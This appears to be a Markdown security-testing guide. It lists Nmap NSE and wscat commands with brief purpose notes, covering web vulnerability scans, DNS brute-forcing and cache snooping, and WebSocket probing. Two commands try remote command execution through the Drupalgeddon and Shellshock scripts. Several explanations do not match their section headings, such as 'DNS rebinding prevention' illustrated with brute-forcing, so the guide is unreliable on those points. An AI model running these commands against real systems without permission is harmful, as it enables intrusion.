## Introduction <a name="introduction"></a>
Welcome to your go-to guide for diving deep into the world of cybersecurity. Created for professionals by professionals, this guide will illuminate the landscape of modern web exploitation, DNS rebinding, and more, with practical tools and tactics to boost your threat-detection capabilities.

## Modern Web Exploitation Techniques <a name="modern-web-exploitation-techniques"></a>
Understanding the ins and outs of how attackers can exploit web vulnerabilities is fundamental for defending against them. Here's a practical example to get you started:

**Command:** 
```bash
nmap -p80,443 --script http-vuln-* target.com
```
**Purpose:** This Nmap command scans for common vulnerabilities in web applications on the specified ports.

**Advanced Command:**
```bash
nmap -p80,443 --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" target.com
```
**Purpose:** This command uses Nmap to check if the target Drupal site is vulnerable to the CVE-2014-3704 (also known as 'Drupalgeddon') and attempts to run a command.

## DNS Rebinding & Prevention <a name="dns-rebinding-and-prevention"></a>
DNS rebinding represents a tricky threat in network security. By mastering prevention techniques, you enhance your cybersecurity toolkit significantly.

**Command:**
```bash
nmap --script dns-brute target.com
```
**Purpose:** Executes a DNS brute-force attack, illustrating the need for robust DNS security measures.

**Advanced Command:**
```bash
nmap --script dns-cache-snoop.nse --script-args 'dns-cache-snoop.mode=timed,dns-cache-snoop.domains={target.com,www.target.com}' 
```
**Purpose:** This command uses Nmap to perform a DNS cache snooping attack, which can reveal if a DNS server has recently resolved specific domains, aiding in the gathering of reconnaissance information.

## Advanced Techniques: Second-Order Attacks & Command Injection <a name="second-order-attacks-and-command-injection"></a>
Delve into the complexities of second-order attacks where the payload activates after initial deploymentâ€”a sophisticated strategy often overlooked.

**Command:**
```bash
nmap --script http-shellshock --script-args uri=/cgi-bin/bin,target=192.168.1.100
```
**Purpose:** This command checks for vulnerabilities to the infamous Shellshock bug in specified targets.

**Advanced Command:**
```bash
nmap --script http-shellshock --script-args 'http-shellshock.uri=/cgi-bin/bin,http-shellshock.cmd="ls -la",http-shellshock.header="User-Agent"' target.com
```
**Purpose:** This command not only checks for Shellshock vulnerability but also attempts to run a command (`ls -la`) on the target, demonstrating the potential impact of the vulnerability.

## Exploring Real-Time Threats: WebSockets & Their Vulnerabilities <a name="websockets-and-websocket-attacks"></a>
In a world where real-time interaction is the norm, understanding the potential security risks of WebSockets is crucial for any cybersecurity arsenal.

**Command:**
```bash
wscat -c ws://target.com/socket
```
**Purpose:** Connects to a WebSocket, demonstrating both the utility and potential security holes of real-time web communication.

**Advanced Command:**
```bash
wscat -x '{"type":"ping"}' -c ws://target.com/socket
```
**Purpose:** This command sends a JSON payload to the WebSocket, which can be used to test how the server handles different types of input and potentially uncover vulnerabilities.
